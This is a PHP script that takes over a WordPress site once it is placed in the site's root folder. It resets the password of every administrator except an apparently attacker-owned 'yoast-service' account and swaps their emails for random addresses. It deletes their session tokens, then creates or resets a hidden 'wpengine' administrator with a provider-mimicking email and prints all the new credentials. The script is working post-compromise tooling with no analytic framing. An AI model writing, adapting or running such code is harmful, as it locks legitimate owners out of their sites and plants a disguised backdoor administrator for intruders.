<?php
error_reporting(0);
@set_time_limit(0);

if (!file_exists('wp-load.php')) {
    die("[-] wp-load.php not found in this folder.");
}

require_once 'wp-load.php';
require_once ABSPATH . 'wp-includes/registration.php';

function random_email($len = 10) {
    $name = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, $len);
    $domains = ['gmail.com', 'yahoo.com', 'hotmail.com'];
    return $name . '@' . $domains[array_rand($domains)];
}

function force_logout_user($user_id) {
    global $wpdb;
    $wpdb->delete($wpdb->usermeta, [
        'user_id' => $user_id,
        'meta_key' => '_session_tokens'
    ]);
}

$site_url = get_bloginfo('url');
echo "<h3>🌐 Site: <strong>$site_url</strong></h3>";

echo "<h4>🛡️ Resetting Administrators:</h4>";
$admin_users = get_users(['role' => 'Administrator']);

foreach ($admin_users as $user) {
    if ($user->user_login === 'yoast-service') continue; // skip self

    $new_pass = wp_generate_password(12, true);
    $new_email = random_email();

    wp_set_password($new_pass, $user->ID);
    wp_update_user([
        'ID' => $user->ID,
        'user_email' => $new_email
    ]);
    force_logout_user($user->ID); // force logout via DB

    echo "🔁 User: <strong>{$user->user_login}</strong><br>";
    echo "🔑 New Pass: <code>$new_pass</code><br>";
    echo "📧 New Email: <code>$new_email</code><br><br>";
}

// Tambahkan atau update wpengine
$password = wp_generate_password(12, true);

if (username_exists('wpengine')) {
    $user = get_user_by('login', 'wpengine');
    wp_set_password($password, $user->ID);
    force_logout_user($user->ID);
    echo "<h4>♻️ wpengine already exists, password updated + force logout.</h4>";
} else {
    $user_id = wp_create_user('wpengine', $password, 'wpengine@wordpress.com');
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    force_logout_user($user_id);
    echo "<h4>✅ wpengine created successfully.</h4>";
}

echo "👤 Username: <strong>wpengine</strong><br>";
echo "🔑 Password: <code>$password</code><br>";
echo "📧 Email: <code>wpengine@wordpress.com</code><br>";

// Clear current session if running from browser
wp_clear_auth_cookie();
?>